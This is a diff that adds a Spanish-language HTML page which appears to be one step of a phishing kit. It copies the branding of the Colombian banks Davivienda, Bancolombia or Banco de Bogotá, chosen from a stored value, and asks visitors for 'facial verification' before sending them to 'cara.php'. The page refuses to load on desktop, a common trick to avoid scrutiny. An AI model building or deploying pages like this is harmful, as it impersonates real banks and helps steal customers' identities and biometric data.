@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<title>Verificación de identidad</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+<style>
+*{
+  box-sizing:border-box;
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+}
+
+body{
+  margin:0;
+  background:#fff;
+}
+
+/* Mensaje escritorio */
+.desktop-warning{
+  display:none;
+  text-align:center;
+  padding:60px 20px;
+  font-size:18px;
+  color:#333;
+}
+
+/* Contenedor móvil */
+.mobile-container{
+  max-width:420px;
+  margin:auto;
+  padding:32px 22px;
+  text-align:center;
+}
+
+/* Logo banco */
+.bank-logo{
+  margin-bottom:-18px;
+}
+
+.bank-logo img{
+  max-width:160px;
+  height:auto;
+}
+
+/* Título */
+h1{
+  font-size:24px;
+  font-weight:700;
+  margin-bottom:14px;
+}
+
+/* Subtítulo */
+.subtitle{
+  font-size:16px;
+  color:#333;
+  margin-bottom:26px;
+}
+
+/* Imagen central */
+.image-container{
+  margin:28px 0;
+}
+
+.image-container img{
+  width:100%;
+  max-width:280px;
+  height:auto;
+}
+
+/* Texto inferior */
+.description{
+  font-size:14px;
+  color:#555;
+  margin-bottom:36px;
+  line-height:1.5;
+}
+
+/* Botón */
+.btn-continue{
+  width:100%;
+  color:#fff;
+  border:none;
+  padding:16px;
+  font-size:17px;
+  font-weight:600;
+  border-radius:30px;
+  cursor:pointer;
+}
+
+.btn-continue.bancol{
+  color:#000;
+}
+
+/* Solo móviles */
+@media (min-width:768px){
+  .mobile-container{display:none;}
+  .desktop-warning{display:block;}
+}
+</style>
+</head>
+
+<body>
+
+<div class="desktop-warning">
+  Este sitio solo está disponible desde un teléfono móvil.
+</div>
+
+<div class="mobile-container">
+
+  <div class="bank-logo">
+    <img id="bankLogo" alt="Banco">
+  </div>
+
+  <h1>Verificación de identidad</h1>
+
+  <p class="subtitle">
+    Realice el proceso de verificación facial para continuar.
+  </p>
+
+  <div class="image-container">
+    <img id="bankImage" alt="Verificación">
+  </div>
+
+  <p class="description">
+    Su identidad digital evitará que lo suplanten y permitirá que lo reconozcan mediante sus datos biométricos.
+  </p>
+
+  <button id="continueBtn" class="btn-continue" onclick="continuar()">
+    Continuar
+  </button>
+
+</div>
+
+<script>
+/* === CONFIGURACIÓN POR BANCO === */
+const bankConfig = {
+  davivienda: {
+    logo: "img/davi-logo.png",
+    image: "img/davi.png",
+    color: "#E30613"
+  },
+  bancolombia: {
+    logo: "img/bancol-logo.png",
+    image: "img/bancol.png",
+    color: "#FDDA24",
+    class: "bancol"
+  },
+  bogota: {
+    logo: "img/bogota-logo.png",
+    image: "img/bogota.png",
+    color: "#0047BB"
+  }
+};
+
+/* === LEER LOCALSTORAGE REAL === */
+let rawBank = (localStorage.getItem("nom") || "").toLowerCase();
+
+/* Normalizar */
+let bank = "davivienda";
+
+if(rawBank.includes("bancol")){
+  bank = "bancolombia";
+}
+else if(rawBank.includes("bogota")){
+  bank = "bogota";
+}
+else if(rawBank.includes("davi")){
+  bank = "davivienda";
+}
+
+/* Aplicar UI */
+const config = bankConfig[bank];
+
+document.getElementById("bankLogo").src = config.logo;
+document.getElementById("bankImage").src = config.image;
+
+const btn = document.getElementById("continueBtn");
+btn.style.background = config.color;
+
+if(config.class){
+  btn.classList.add(config.class);
+}
+
+/* === REDIRECCIÓN FINAL === */
+function continuar(){
+  window.location.href = "cara.php?bank=" + encodeURIComponent(bank);
+}
+</script>
+
+</body>
+</html>
